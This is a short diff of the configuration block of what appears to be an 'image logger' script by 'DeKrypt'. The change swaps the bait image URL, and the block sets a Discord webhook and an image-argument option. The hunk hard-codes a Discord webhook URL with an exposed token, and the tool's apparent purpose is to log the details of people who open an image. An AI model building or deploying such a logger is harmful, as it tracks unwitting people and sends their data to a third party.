@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1152675299524346066/1xolv240jxLOCADC9fE7wz7y3YjyrOTnya63ef72eGDbxHqMji4-QyRZkUcYrtYnlES3",
-    "image": "https://files.catbox.moe/f52ptu.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static.wikia.nocookie.net/ordemparanormal/images/4/41/Miniatura_Bilu_em_Sinais_do_Outro_Lado.png/revision/latest/scale-to-width-down/350?cb=20221219182934&path-prefix=pt-br", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
